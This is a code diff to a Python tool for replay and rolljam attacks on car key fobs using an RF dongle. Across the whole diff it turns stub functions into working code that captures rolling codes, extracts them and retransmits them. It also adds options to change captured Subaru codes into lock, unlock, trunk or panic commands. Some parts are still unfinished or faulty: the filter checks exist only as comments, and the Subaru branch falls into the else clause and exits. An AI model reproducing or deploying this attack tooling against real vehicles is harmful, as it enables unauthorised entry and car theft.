@@ -8,11 +8,12 @@ from struct import *
 
 def main():
     parser = argparse.ArgumentParser(description="Replay and rolljam attacks against car key fobs with the yardstick one. Jammer for rolljam not included; check README.md for options and usage")
-    parser.add_argument("functions", choices=['replay', 'rolljam'], help="Replay: Capture everything on a certain frequency and replay it upon pressing enter.  Rolljam: Capture codes and replay the first automatically. Saves remaining codes to use later, and for certain cars these can be altered (Use rolljam with -r or -t to save to/transmit from a file)")
+    parser.add_argument("functions", choices=['replay', 'rolljam'], help="Replay: Capture everything on a certain frequency and replay it upon pressing enter. | Rolljam: Capture codes and replay the first automatically. Saves remaining codes to use later, and for certain cars these can be altered (Use rolljam with -r or -t to save to/transmit from a file)")
 
-    parser.add_argument("-b", "--baudrate", action="store", type=str, default="4000", help="Set how quickly bits are read and transferred")
-    parser.add_argument("-f", "--frequency", action="store", type=str, default="315000000", help="Set the frequency to receive and transmit on")
-    parser.add_argument("-m", "--modulation", action="store", type=str, default="MOD_ASK_OOK", help="Set type of (de)modulation")
+    parser.add_argument("-b", "--baudrate", action="store", type=int, default="4800", help="Default=4800 | Set how quickly bits are read and transferred")
+    parser.add_argument("-f", "--frequency", action="store", type=int, default="315000000", help="Default=315mhz | Set the frequency to receive and transmit on")
+    parser.add_argument("-m", "--modulation", action="store", type=str, default="MOD_ASK_OOK", help="Default=ASK_OOK |  Set type of (de)modulation")
+    parser.add_argument("-s", "--sleep", action="store", type=int, default="20", help="Default=20 | Changes how many codes are captured before being asked to continue")
 
     parser.add_argument("-c", "--car", action="store", type=str, help="Specify a supported car type for extra functionality. Can be used with --transmit. Use -c list to see all supported cars (rolljam)")
     parser.add_argument("-r", "--receive", action="store", type=str, help="Receive radio frequencies and log to file (rolljam)")
@@ -24,7 +25,7 @@ def main():
         exit(0)
 
     if args.functions=='replay':
-        replay(args.frequency, args.baudrate, args.modulation)
+        replay(args.frequency, args.baudrate, args.modulation, args.sleep)
         exit(0)
 
     if args.functions=='rolljam':
@@ -36,7 +37,7 @@ def main():
         #records codes and writes to file, tells how many codes written
         elif args.receive!=None:
             #signal = "test\nlines\ngo\nbrrrr"
-            signal = roll_receive(args.frequency, args.baudrate, args.modulation)
+            signal = roll_receive(args.frequency, args.baudrate, args.modulation, args.sleep)
             with open(args.receive, "w") as f1:
                 f1.write(signal)
                 f1.close()
@@ -77,21 +78,67 @@ def main():
 
         #go into rolljam looping function
         else:
-            rolljam(args.frequency, args.baudrate, args.modulation, args.car)
+            rolljam(args.frequency, args.baudrate, args.modulation, args.car, args.sleep)
 
 
 
-def replay(frequency, baudrate, modulation):
-    
-    print("")
-    #SIMPLE RECORD AND TRANSMIT EVERYTHING RECORDED UPON PRESSING ENTER
-    #cycle ys1 power
+def replay(frequency, baudrate, modulation, rsleep):
+    #rfcat setup
+    d = RfCat()
+    d.setFreq(frequency)
+    #not sure what type of var modulation needs to be, so here's a workaround
+    if modulation=="MOD_2FSK":
+        d.setMdmModulation(MOD_2FSK)
+    else:
+        d.setMdmModulation(MOD_ASK_OOK)
+    d.setMdmDRate(baudrate)
+    d.setMaxPower()
+    d.lowball()
+
+    #function to receive codes
+    slp=0
+    i="y"
+    signal=[]
+    while i=="y":
+        try:
+            rfcode,t = d.RFrecv()
+            hex_codes = rfcode.encode("hex")
+            #print(hex_codes)
+        except ChipconUsbTimeoutException:
+            pass
+        slp+=1
+        signal.append(hex_codes)
+        if slp==(rsleep/2):
+            i=raw_input("Would you like to continue the capture? (y)es  (n)o ")
+            slp=0
+    codeline = ""
+    for c in signal:
+        codeline += c
+    #print(codeline)
+    codes = re.split("ffff*", codeline)
+
+    #formatting
+    for code in codes:
+        #print(code)
+        if len(code)%2 != 0:
+            code = "0"+code
+        raw_code = ""
+        if len(code)>20:
+            binary = bin(int(code,16))[2:]
+            raw_code = bitstring.BitArray(bin=(binary)).tobytes()
+        else:
+            continue
+        #transmitting
+        print("[+] Sending code "+str(code))
+        #d.makePktFLEN(250)
+        d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*10)
+        print("[+] Sent")
 
 
-def rolljam(frequency, baudrate, modulation, car):
+def rolljam(frequency, baudrate, modulation, car, rsleep):
     print("Start your jammer...")
     time.sleep(1)
-    signal=roll_receive(frequency, baudrate, modulation)
+    signal=roll_receive(frequency, baudrate, modulation, rsleep)
     print("[+] Received "+str(len(signal.splitlines()))+" codes")
 
     print("Stop jamming...")
@@ -143,24 +190,80 @@ def rolljam(frequency, baudrate, modulation, car):
 
 
 #receives til user hits enter, then sorts codes out separated by newlines
-def roll_receive(frequency, baudrate, modulation):
-    print("ROLL RECEIVE")
-    #regex to filter out junk
-    signal="test\nreceive\nfunction\none\ntwo"
-    #if 0 codes received:
-        #print("[-] Received 0 codes")
-        #exit(1)
-    #cycle ys1 power
+def roll_receive(frequency, baudrate, modulation, rsleep):
+    #rfcat setup
+    d = RfCat()
+    d.setFreq(frequency)
+    #not sure what type of var modulation needs to be, so here's a workaround
+    if modulation=="MOD_2FSK":
+        d.setMdmModulation(MOD_2FSK)
+    else:
+        d.setMdmModulation(MOD_ASK_OOK)
+    d.setMdmDRate(baudrate)
+    d.setMaxPower()
+    d.lowball()
+
+    #function to receive codes
+    slp=0
+    i="y"
+    signal=[]
+    while i=="y":
+        try:
+            rfcode,t = d.RFrecv()
+            hex_codes = rfcode.encode("hex")
+            #print(hex_codes)
+        except ChipconUsbTimeoutException:
+            pass
+        slp+=1
+        signal.append(hex_codes)
+        if slp==(rsleep/2):
+            i=raw_input("Would you like to continue the capture? (y)es  (n)o ")
+            slp=0
+    codeline = ""
+    for c in signal:
+        codeline += c
+    #print(codeline)
+    codes = re.split("ffff*", codeline)
+
+    #formatting
+    for code in codes:
+        if len(code)%2 != 0:
+            code = "0"+code
+        raw_code = ""
+        signal_list=[]
+        if len(code)>20:  #may need changed if smaller codes found
+            signal_list.append(code)
+        signal = "\n".join(signal_list)
+    d.cleanup()
+    if len(signal)==0:
+        print("[-] Received 0 codes")
+        exit(1)
     return signal  #(separate found codes by line) DO NOT SPLIT. just have \n's
 
 
 #transmits one code
 def roll_transmit(frequency, baudrate, modulation, code):
-    print("ROLL TRANSMIT")
-    #code is a single line out of signal
-    #will probably have to convert code into bits before transmitting and stuff
-    #transmit code
-    #cycle ys1 power
+    #rfcat setup
+    d = RfCat()
+    d.setFreq(frequency)
+    #not sure what type of var modulation needs to be, so here's a workaround
+    if modulation=="MOD_2FSK":
+        d.setMdmModulation(MOD_2FSK)
+    else:
+        d.setMdmModulation(MOD_ASK_OOK)
+    d.setMdmDRate(baudrate)
+    d.setMaxPower()
+    d.lowball()
+
+    #formatting
+    binary = bin(int(code,16))[2:]
+    raw_code = bitstring.BitArray(bin=(binary)).tobytes()
+    #transmitting
+    print("[+] Sending code "+str(code))
+    #d.makePktFLEN(250)
+    d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*10)
+    print("[+] Sent")
+    d.cleanup()
 
 
 #prints list of supported cars
@@ -169,11 +272,10 @@ def list():
 
 
 #edits code sent to function to change it's functionality
+#may have to convert hex to bin and back to hex
 def rolljam_car(car, code):
     c = raw_input("Would you like to: open (t)runk, (p)anic alarm, (l)ock, (u)nlock: ")
-    #WILL PROB HAVE TO CONVERT TO BITS TO FIGURE OUT PREFIX+CODE, THEN BACK TO HEX
     if car=="subaru":
-        print("SUBARU")
         if c=="l":
             prefix="lock"
             #code=code.parse_out_prefix
@@ -191,11 +293,12 @@ def rolljam_car(car, code):
             #code=code.parse_out_prefix
             new_code = prefix+code
     else:
-        print("[-] Car not supported")
-        exit(1)
+        print("[-] Changing codes not supported")
+        return code
     if c!="l" and c!="u" and c!="t" and c!="p":
         print("[-] Unknown command, code will remain unchanged.")
-        new_code=code
+        return code
+    print("[+] Code changed for ",car)
     return new_code
 
 
@@ -203,12 +306,23 @@ def rolljam_car(car, code):
 def filter(car, codes):
     filtered_codes=[]
     if car=="subaru":
-        print("")
+        print("Filtering codes for "+car)
         for c in codes:
-            #if passes regex:
+            #if passes regex:  prob convert to bin first, then compare, then hex
                 filtered_codes.append(c)
+
+    if car=="camaro":
+        print("Filtering codes for "+car)
+        for c in codes:
+            #if check for prefix with regex. prob convert to bin compare, then hex
+                filtered_codes.append(c)
+
     else:
         print("[-] Car not supported")
+        exit(1)
+
+    if len(filtered_codes)==0:
+        print("[-] No codes found")
         exit(1)
     return filtered_codes
 
